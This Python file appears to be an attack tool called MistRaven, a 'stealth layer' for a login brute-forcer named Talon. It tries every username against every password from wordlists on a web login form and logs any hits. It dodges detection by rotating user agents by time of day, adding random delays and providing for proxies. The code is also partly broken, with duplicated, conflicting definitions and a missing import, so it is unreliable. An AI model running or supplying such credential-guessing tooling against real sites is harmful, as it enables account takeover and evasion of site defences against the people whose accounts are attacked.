from libTalon import try_login
import requests
import argparse
import random
import datetime

USER_AGENTS = {
    "desktop": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)"
    ],
    "mobile": [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X)",
        "Mozilla/5.0 (Android 11; Mobile)"
    ]
}

def stealth_headers():
    hour = datetime.datetime.now().hour
    platform = "mobile" if hour >= 20 or hour < 6 else "desktop"

    return {
        "User-Agent": random.choice(USER_AGENTS[platform]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }

def stealth_sleep(base_delay):
    time.sleep(random.uniform(base_delay * 0.7, base_delay * 1.3))

# Stealth agent pool
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile)"
]

# Optional future: Proxy list
PROXIES = []  # e.g., ['http://proxy1:port', 'http://proxy2:port']

def stealth_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded"
    }

def random_delay(min_d=0.5, max_d=2.5):
    time.sleep(random.uniform(min_d, max_d))

def log_attempt(u, p, success=False):
    status = "🟢 SUCCESS" if success else "🔴 FAIL"
    print(f"{status} → {u}:{p}")

def mist_login(url, username, password, fields, fail_string):
    headers = stealth_headers()
    result = try_login(url, username.strip(), password.strip(), fields, fail_string, headers)

    if result is True:
        log_attempt(username, password, success=True)
    elif result is False:
        log_attempt(username, password)
    else:
        print(f"⚠️ Network error on {username}:{password}")


def run_mist_raven(url, users_path, pass_path, fields, fail_string):
    with open(users_path) as ulist, open(pass_path) as plist:
        for username in ulist:
            for password in plist:
                mist_login(url, username, password, fields, fail_string)
                random_delay()
            plist.seek(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MistRaven: Stealth Layer for Talon")
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-U", "--userlist", required=True)
    parser.add_argument("-P", "--passlist", required=True)
    parser.add_argument("-f", "--fields", required=True)
    parser.add_argument("-s", "--fail", required=True)
    args = parser.parse_args()

    fields = args.fields.split(",")
    run_mist_raven(args.url, args.userlist, args.passlist, fields, args.fail)
